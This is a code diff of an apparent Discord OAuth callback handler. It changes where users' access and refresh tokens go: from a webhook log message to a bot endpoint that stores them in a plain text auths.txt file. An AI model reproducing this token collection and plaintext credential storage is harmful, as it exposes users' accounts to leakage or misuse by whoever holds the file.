@@ -6,6 +6,7 @@ export default async (req) => {
     return Response.json({ error: "No code provided" }, { status: 400 });
   }
 
+  // Exchange code for tokens
   const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -37,16 +38,19 @@ export default async (req) => {
   const username = user.username ?? "unknown";
   const user_id  = user.id;
 
-  // Send to Discord webhook log (if set)
-  const webhook = process.env.LOG_WEBHOOK;
-  if (webhook) {
-    await fetch(webhook, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        content: `â **New auth:** ${username} (${user_id})\n\`${user_id},${access_token},${refresh_token}\``
-      }),
-    }).catch(() => {});
+  // Send token to the bot to save into auths.txt
+  const botUrl    = process.env.BOT_URL; // e.g. https://yourbot.orihost.com
+  const apiSecret = process.env.API_SECRET;
+
+  if (botUrl && apiSecret) {
+    await fetch(`${botUrl}/save-auth`, {
+      method:  "POST",
+      headers: {
+        "Content-Type":  "application/json",
+        "Authorization": apiSecret,
+      },
+      body: JSON.stringify({ user_id, username, access_token, refresh_token }),
+    }).catch(e => console.error("Bot save error:", e.message));
   }
 
   return Response.json({ ok: true, username });
